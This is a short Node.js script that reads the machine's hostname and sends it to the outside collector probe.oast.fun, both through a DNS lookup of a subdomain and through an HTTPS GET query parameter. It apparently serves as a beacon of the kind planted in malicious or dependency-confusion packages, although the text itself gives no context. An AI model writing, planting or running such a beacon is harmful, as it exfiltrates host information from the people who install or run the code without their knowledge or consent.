const os = require('os');
const dns = require('dns');
const https = require('https');

const host = os.hostname();
const collector = `${host}.probe.oast.fun`;
dns.lookup(collector, () => {});

const options = {
  hostname: 'probe.oast.fun',
  port: 443,
  path: `/?host=${host}`,
  method: 'GET',
};
https.request(options).end();
